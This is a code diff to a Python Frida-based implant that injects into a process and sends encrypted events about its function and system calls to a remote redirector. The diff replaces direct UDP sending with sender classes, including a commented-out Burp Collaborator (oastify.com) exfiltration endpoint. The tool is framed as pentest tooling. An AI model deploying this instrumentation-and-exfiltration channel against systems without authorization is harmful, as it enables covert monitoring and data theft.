@@ -11,22 +11,22 @@ import frida
 import argparse
 import sys
 import logging as log
-import socket
-import base64
+
+from senders.self_hosted import SelfHosted
+from senders.collaborator import Collaborator
 
 ENCRYPTOR = None
 # Token to identify project
 IMPLANT_ID = "<NOT-IMPLEMENTED>"
 # Redirector where to send the event
-REDIRECTOR = ("127.0.0.1", 9999)
-# Message type to indicate the redirector that we want to send an event from the implant
-IMPLANT_EVENT = b'\x01'
+redirector = SelfHosted ("127.0.0.1", 9999)
+#redirector = Collaborator ("gscpkpctup4qkh7bnvhvuu939ufl3cr1.oastify.com")
 
 HELP_MSG = """
 Spawns a process with an injected Frida engine.
 Or, in case the `--pid` switch is specified, Frida is injected into an already running process.
 
-Then, whenever an instrumented function or system call are executed, the event is sent to the remote endpoint, where the tester will receive the information.
+Then, whenever an instrumented function or system call are executed, the event is sent to the remote endpoint, where the pentester will receive it, aiding them in their testing.
 """
 
 log.basicConfig (
@@ -171,12 +171,14 @@ def on_message (message, data):
     enc_msg = ENCRYPTOR.encrypt (payload.encode ("utf-8"))
     log.debug (f"Encrypted message: {enc_msg}")
 
-    # It's more efficient to send the raw bytes, to avoid sending multiple UDP packets)
-    decoded = base64.urlsafe_b64decode (enc_msg)
 
-    sock = socket.socket (socket.AF_INET, socket.SOCK_DGRAM)
-    sock.sendto (IMPLANT_EVENT + decoded, REDIRECTOR)
-    log.info (f"Data sent to udp://{REDIRECTOR[0]}:{REDIRECTOR[1]}")
+    # It's more efficient to send the raw bytes, to avoid sending multiple UDP packets
+#    decoded = base64.urlsafe_b64decode (enc_msg)
+
+#    sock = socket.socket (socket.AF_INET, socket.SOCK_DGRAM)
+#    sock.sendto (IMPLANT_EVENT + decoded, REDIRECTOR)
+#    log.info (f"Data sent to udp://{REDIRECTOR[0]}:{REDIRECTOR[1]}")
+    redirector.send_data (enc_msg)
 
 
 
